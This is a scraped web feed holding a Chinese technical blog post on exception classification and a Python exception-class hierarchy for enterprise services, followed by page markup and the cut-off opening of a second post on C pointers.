h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代分布式系统和微服务架构中，异常不再是偶然的"意外"，而是系统运行的常态。随着系统复杂度的提升，异常的种类和数量呈指数级增长，如何对异常进行科学的分类和管理，成为保障系统稳定性和可维护性的关键环节。</p>
<p>异常分类是异常架构设计的基础，它直接影响着异常处理策略的制定、监控告警的配置以及故障诊断的效率。一个清晰、合理的异常分类体系，能够让开发团队快速定位问题，帮助运维人员准确判断故障等级，使产品团队更好地理解业务影响。</p>
<h2 data-id="heading-0">分类维度</h2>
<p>从实践经验来看，优秀的异常分类应具备以下特征：</p>
<ul>
<li><strong>明确性</strong>：每种异常类型都有清晰的定义和边界</li>
<li><strong>实用性</strong>：分类标准与实际业务场景紧密结合</li>
<li><strong>可操作性</strong>：便于自动化处理和人工干预</li>
<li><strong>可扩展性</strong>：能够适应业务发展和技术演进</li>
</ul>
<p>异常分类可从以下多维度切入：</p>
<p><strong>核心责任维度</strong></p>
<ul>
<li><strong>来源</strong>：系统异常（外部/基础设施） vs 业务异常（内部规则）</li>
<li><strong>责任方</strong>：客户端错误（4xx） vs 服务器错误（5xx）</li>
</ul>
<p><strong>运维监控维度</strong></p>
<ul>
<li><strong>严重程度</strong>：致命/错误/警告/信息</li>
<li><strong>可恢复性</strong>：可重试/不可重试/可降级</li>
<li><strong>影响范围</strong>：用户/租户/服务/系统级</li>
</ul>
<p><strong>技术架构维度</strong></p>
<ul>
<li><strong>生命周期阶段</strong>：启动/运行/关闭</li>
<li><strong>数据流阶段</strong>：输入/处理/输出/存储</li>
<li><strong>架构层次</strong>：表现层/应用层/领域层/基础设施层</li>
</ul>
<p><strong>商业考量维度</strong></p>
<ul>
<li><strong>SLA影响</strong>：违例/风险/无影响</li>
</ul>
<p>分类目的是指导处理策略，而非过度设计。对于绝大多数基础项目，按照<strong>来源+责任方</strong>来进行分类是合适的，是足够满足业务需求的。</p>
<hr/>
<p>特别地，对于<strong>来源</strong>，从开发者视角来划分：</p>
<ul>
<li>平台异常（外部异常、内置异常）：编程语言、开发框架、中间件、第三方库、远程调用等抛出的异常，由元开发者定义。</li>
<li>应用异常：由业务开发者定义的异常。</li>
</ul>
<blockquote>
<p>元开发者，指的是为开发者服务的开发者。</p>
</blockquote>
<h3 data-id="heading-1">平台异常</h3>
<p>由编程语言、运行时、框架、中间件等"元开发者"定义的异常。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. 语言运行时</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">language_runtime</span>():
    <span class="hljs-comment"># 内存、类型、运算等基础错误</span>
    <span class="hljs-keyword">try</span>:
        x = <span class="hljs-number">1</span> / <span class="hljs-number">0</span>                    <span class="hljs-comment"># ZeroDivisionError</span>
        y = <span class="hljs-built_in">int</span>(<span class="hljs-string">"abc"</span>)               <span class="hljs-comment"># ValueError</span>
        z = {}[<span class="hljs-string">"nonexistent"</span>]        <span class="hljs-comment"># KeyError</span>
    <span class="hljs-keyword">except</span> (ZeroDivisionError, ValueError, KeyError) <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"语言运行时异常: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)

<span class="hljs-comment"># 2. 操作系统/文件系统</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">os_filesystem</span>():
    <span class="hljs-comment"># 文件、进程、权限等OS相关错误</span>
    <span class="hljs-keyword">import</span> os
    <span class="hljs-keyword">try</span>:
        os.remove(<span class="hljs-string">"/nonexistent.txt"</span>) <span class="hljs-comment"># FileNotFoundError</span>
        <span class="hljs-keyword">import</span> subprocess
        subprocess.run([<span class="hljs-string">"invalid"</span>])   <span class="hljs-comment"># FileNotFoundError</span>
    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"操作系统异常: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 3. 网络/外部服务，包括远程关系调用RPC</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">network_external</span>():
    <span class="hljs-comment"># 网络连接、HTTP请求等</span>
    <span class="hljs-keyword">import</span> requests
    <span class="hljs-keyword">try</span>:
        response = requests.get(<span class="hljs-string">"http://invalid"</span>, timeout=<span class="hljs-number">1</span>)
    <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"网络异常: <span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">except</span> requests.exceptions.Timeout <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"超时异常: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 4. 数据库/中间件</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">database_middleware</span>():
    <span class="hljs-comment"># 数据库连接、查询、事务等</span>
    <span class="hljs-keyword">import</span> sqlite3
    <span class="hljs-keyword">try</span>:
        conn = sqlite3.connect(<span class="hljs-string">":memory:"</span>)
        conn.execute(<span class="hljs-string">"INVALID SQL"</span>)   <span class="hljs-comment"># sqlite3.OperationalError</span>
    <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"数据库异常: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p>开发者不需要定义平台异常，但需要对异常进行处理，后续系列文章中再详细描述异常处理。</p>
<h3 data-id="heading-2">应用异常</h3>
<p>又称为自定义异常，由业务开发者为了满足特定业务需求而创建的异常，反映业务规则、流程限制和领域逻辑，继承<code>Exception</code>类创建新类<code>class AppException(Exception)</code>。应用异常的核心特征：</p>
<ul>
<li><strong>业务语义性</strong>：异常名称和消息反映业务概念，如：<code>InsufficientFundsException</code>（余额不足）</li>
<li><strong>完全可控</strong>：开发者决定何时抛出、抛出什么，可以添加任何业务相关属性</li>
<li><strong>层次结构化</strong>：可以建立有意义的继承体系，便于分类处理和监控</li>
<li><strong>主动设计</strong>：作为业务逻辑的一部分，提前设计异常类型和场景</li>
</ul>
<p>基于<strong>防御性编程、Fail-Fast、用户友好、可观测性</strong>四大核心原则，将自定义异常细分为<strong>客户端异常、业务异常、服务端异常</strong>三层架构，是当前企业级应用开发中<strong>成熟且合理的分层异常治理方案</strong>，相比单一自定义异常或原生异常混用的模式，具备显著的工程化优势。</p>
<h4 data-id="heading-3">客户端异常 4xx</h4>
<p>客户端异常是由<strong>调用方</strong>（前端用户、第三方服务、内部调用方）的行为或输入不符合服务约定而引发的异常，服务端本身无任何故障，责任完全在调用方。</p>
<p><strong>典型场景</strong></p>
<ul>
<li>请求参数错误：参数缺失、参数类型不匹配、参数格式非法（如手机号格式错误、邮箱格式错误、ID为非数字）</li>
<li>请求权限不足：未登录、登录过期、无接口访问权限、无资源操作权限</li>
<li>请求资源不存在：访问的接口路径错误、请求的文件/数据ID不存在</li>
<li>请求方式错误：使用GET请求调用仅支持POST的接口、请求头缺失必要字段</li>
<li>调用频率超限：触发接口限流、防刷规则</li>
</ul>
<h4 data-id="heading-4">业务异常 299</h4>
<p>业务异常是<strong>在服务端逻辑正常执行、请求参数合法的前提下，因业务规则不满足、业务流程无法继续推进</strong>而引发的异常，属于业务层面的预期性阻断，而非系统故障。业务异常可以归属于正常的业务逻辑，因此可将其划分到状态码2xx序列，或者自行定义一个特定值或区间值，便于进行异常处理。</p>
<p><strong>典型场景</strong></p>
<ul>
<li>业务规则校验：账户余额不足、商品库存不足、用户已存在、订单状态不支持当前操作、验证码错误</li>
<li>业务流程阻断：重复提交订单、未实名认证无法发起提现、商品已下架无法购买</li>
<li>业务逻辑限制：转账金额超出单日限额、用户账号已冻结</li>
</ul>
<h4 data-id="heading-5">服务端异常 5XX</h4>
<p>服务端异常是<strong>由服务自身的代码缺陷、基础设施故障、依赖服务不可用</strong>引发的异常，责任完全在服务提供方，属于非预期的系统级故障。</p>
<p><strong>典型场景</strong></p>
<ul>
<li>代码逻辑错误：空指针异常、数组越界、类型转换异常、死循环、算法逻辑bug</li>
<li>基础设施故障：数据库连接失败、Redis宕机、MQ消息发送失败、磁盘空间不足</li>
<li>依赖服务异常：调用第三方接口超时、内部微服务调用失败、熔断降级触发</li>
<li>资源耗尽：线程池耗尽、内存溢出、文件句柄不足</li>
</ul>
<h4 data-id="heading-6">未知异常</h4>
<p>未知异常是异常治理的重点，因为它代表了系统中尚未被充分理解和处理的潜在风险。这类异常通常在开发阶段未能预见，但在运行时却可能出现，对系统的稳定性和可维护性构成挑战。未知异常应当归类到服务端异常（5XX系列）中，作为ServerException的子类UnknownException进行专门处理。</p>
<p><strong>典型场景</strong>：</p>
<ul>
<li>第三方库升级引入的新异常类型</li>
<li>系统环境变化导致的异常（如新版本操作系统API变更）</li>
<li>硬件故障导致的底层异常</li>
<li>未充分测试的边缘情况</li>
<li>依赖服务的未预期行为变化</li>
</ul>
<p><strong>处理原则</strong>：</p>
<ul>
<li>统一归类到服务端异常，返回5xx状态码</li>
<li>记录详细的错误信息和堆栈跟踪，便于后续分析</li>
<li>触发告警，通知开发团队关注</li>
<li>设置兜底机制，确保系统稳定性</li>
<li>建立反馈机制，将未知异常转化为已知异常</li>
</ul>
<p><strong>在异常治理中的重要性</strong>：</p>
<ul>
<li><strong>风险识别</strong>：未知异常是系统潜在风险的指示器，帮助团队发现系统中的薄弱环节</li>
<li><strong>持续改进</strong>：通过对未知异常的分析和处理，不断完善异常处理策略</li>
<li><strong>系统韧性</strong>：良好的未知异常处理机制能够提升系统的容错能力和恢复能力</li>
<li><strong>监控告警</strong>：未知异常的出现频率和模式是重要的系统健康指标</li>
</ul>
<p>在异常处理实践中，设置通用异常处理器，将所有未明确处理的异常转换为UnknownException，避免敏感信息泄露给客户端。同时，应建立<strong>异常治理</strong>流程，定期分析UnknownException的类型和频率，逐步将其转化为具体的、可处理的异常类型，从而不断优化异常治理体系。</p>
<h3 data-id="heading-7">异常分类举例</h3>
<ul>
<li><strong>客户端异常</strong>：基于主键ID查询用户信息，传入的ID格式非法或为null，返回参数错误异常</li>
<li><strong>业务异常</strong>：基于主键ID查询到用户信息，但用户信息是加密的只允许特定人员查看，返回权限不足异常</li>
<li><strong>服务端异常</strong>：基于主键ID查询用户信息，数据库连接失败，返回系统异常</li>
</ul>
<p>对于我在工作中遇到的一个问题：一个审批流程，最后一个环节需要部门领导申请，但是部门领导没有注册该系统账户，导致工单到部门领导审批结点时被阻塞。这种业务异常的稽核规则应前置到发起该审批流程的时候：“该流程需要部门领导审批，没有查询到您所属部门领导的账户信息，请核实”。</p>
<h3 data-id="heading-8">编程实践</h3>
<p><strong>异常层次架构</strong></p>
<pre><code class="hljs language-scss" lang="scss">Exception (Python内置顶层父类，所有异常根节点，仅作为底层捕获源)
└─ AppBaseException (可选抽象基类，封装通用属性：错误码/提示/HTTP状态码，推荐使用)
   ├─ ClientException (客户端异常根类，接口层抛出)
   │  ├─ ValidationException (参数校验：格式/非空/范围错误)
   │  ├─ AuthenticationException (认证：未登录/Token过期/认证失败)
   │  └─ AuthorizationException (授权：无接口/资源操作权限)
   │
   ├─ BizException (业务异常根类，业务层抛出)
   │  ├─ BusinessRuleException (通用业务规则：余额/库存不足、规则校验失败)
   │  ├─ ResourceException (资源：不存在/已被占用/已删除)
   │  └─ StateException (状态：订单/商品状态不支持当前操作)
   │
   └─ ServerException (服务端异常根类，数据/依赖层抛出，承接所有系统异常转换)
      ├─ InfrastructureException (基础设施异常：数据库/缓存/MQ/文件系统故障)
      ├─ ExternalServiceException (外部服务异常：第三方/内部平台调用超时/连接失败)
      ├─ UnexpectedException (预期内系统异常：可捕获的原生异常转换，如KeyError/IndexError)
      └─ UnknownException (未知异常：未专门处理的原生异常/未预见异常，最终兜底)
</code></pre>
<p>其中，UnknownException作为服务端异常的兜底分类，专门用于处理那些在开发阶段未能预见的异常情况。未知异常是异常治理的重点，因为它们代表了系统中尚未被充分理解和处理的潜在风险。这类异常虽然在发生时无法精确分类，但通过统一的UnknownException处理，可以确保：</p>
<ul>
<li>系统保持稳定运行</li>
<li>为开发团队提供反馈，以便后续优化</li>
<li>避免敏感信息泄露给客户端</li>
<li>便于监控和告警系统的统一管理</li>
<li>作为异常治理的重要指标，推动系统持续改进</li>
</ul>
<p>自定义异常设计实践：</p>
<blockquote>
<p>避免过度设计，参数可根据业务需求添加</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Any</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AppBaseException</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""应用异常基类，封装通用属性"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"系统异常"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"SYSTEM_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">500</span>
    details: <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] = <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__(self.message)

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientException</span>(<span class="hljs-title class_ inherited__">AppBaseException</span>):
    <span class="hljs-string">"""客户端异常基类"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"客户端异常"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"CLIENT_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">400</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidationException</span>(<span class="hljs-title class_ inherited__">ClientException</span>):
    <span class="hljs-string">"""参数校验异常"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"参数校验失败"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"VALIDATION_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">400</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthenticationException</span>(<span class="hljs-title class_ inherited__">ClientException</span>):
    <span class="hljs-string">"""认证异常"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"认证失败"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"AUTHENTICATION_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">401</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthorizationException</span>(<span class="hljs-title class_ inherited__">ClientException</span>):
    <span class="hljs-string">"""授权异常"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"权限不足"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"AUTHORIZATION_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">403</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BizException</span>(<span class="hljs-title class_ inherited__">AppBaseException</span>):
    <span class="hljs-string">"""业务异常基类"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"业务异常"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"BUSINESS_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">299</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerException</span>(<span class="hljs-title class_ inherited__">AppBaseException</span>):
    <span class="hljs-string">"""服务端异常基类"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"服务器异常"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"SERVER_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">500</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UnknownException</span>(<span class="hljs-title class_ inherited__">ServerException</span>):
    <span class="hljs-string">"""未知异常类，用于处理未预见到的异常情况"""</span>
    message: <span class="hljs-built_in">str</span> = <span class="hljs-string">"未知异常"</span>
    error_code: <span class="hljs-built_in">str</span> = <span class="hljs-string">"UNKNOWN_ERROR"</span>
    http_status: <span class="hljs-built_in">int</span> = <span class="hljs-number">500</span>

<span class="hljs-comment"># 使用示例</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">example_usage</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 模拟业务逻辑</span>
        <span class="hljs-keyword">raise</span> ValidationException(
            message=<span class="hljs-string">"手机号格式错误"</span>,
            error_code=<span class="hljs-string">"INVALID_PHONE_FORMAT"</span>,
            details={<span class="hljs-string">"field"</span>: <span class="hljs-string">"phone"</span>, <span class="hljs-string">"value"</span>: <span class="hljs-string">"123"</span>}
        )
    <span class="hljs-keyword">except</span> ValidationException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"捕获到异常: <span class="hljs-subst">{e.message}</span>, 错误码: <span class="hljs-subst">{e.error_code}</span>"</span>)
        <span class="hljs-comment"># 输出: 捕获到异常: 手机号格式错误, 错误码: INVALID_PHONE_FORMAT</span>
</code></pre>
<h2 data-id="heading-9">总结</h2>
<p>本文详细介绍了异常分类的多维度模型和分类原则，包括：</p>
<ol>
<li><strong>分类维度</strong>：从核心责任、运维监控、技术架构、商业考量四个维度对异常进行分类</li>
<li><strong>异常来源</strong>：区分平台异常（系统级）和应用异常（业务级）</li>
<li><strong>三大异常类型</strong>：客户端异常（4xx）、业务异常（299）、服务端异常（5xx）</li>
<li><strong>未知异常处理</strong>：作为异常治理的重点，需要建立兜底机制</li>
<li><strong>异常层次架构</strong>：建立了清晰的异常继承体系</li>
</ol>
<p>通过科学的异常分类，我们可以：</p>
<ul>
<li>明确问题责任边界，快速定位故障根源</li>
<li>便于监控告警配置，提高运维效率</li>
<li>优化用户体验，提供友好的错误信息</li>
<li>为后续异常处理策略奠定基础</li>
</ul>
<h2 data-id="heading-10">下一篇预告：异常处理</h2>
<p>在明确了异常分类之后，下一步是建立有效的异常处理机制，将深入探讨：</p>
<ul>
<li><strong>异常处理策略</strong>：不同异常类型的处理方式，异常抛出</li>
<li><strong>架构层处理</strong>：Controller-Service-Repository三层异常处理实践</li>
<li><strong>异常转换</strong>：如何将底层异常转换为用户友好的错误信息，保持异常信息的完整性</li>
<li><strong>全局异常处理器</strong>：统一异常处理机制</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【C语言深入探索】指针高级应用与极致技巧（一）]]></title>    <link>https://juejin.cn/post/7602800677712199714</link>    <guid>https://juejin.cn/post/7602800677712199714</guid>    <pubDate>2026-02-05T01:08:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602800677712199714" data-draft-id="7602824293165023247" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【C语言深入探索】指针高级应用与极致技巧（一）"/> <meta itemprop="keywords" content="C语言"/> <meta itemprop="datePublished" content="2026-02-05T01:08:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="byte轻骑兵"/> <meta itemprop="url" content="https://juejin.cn/user/3995005743010080"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【C语言深入探索】指针高级应用与极致技巧（一）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3995005743010080/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    byte轻骑兵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T01:08:21.000Z" title="Thu Feb 05 2026 01:08:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 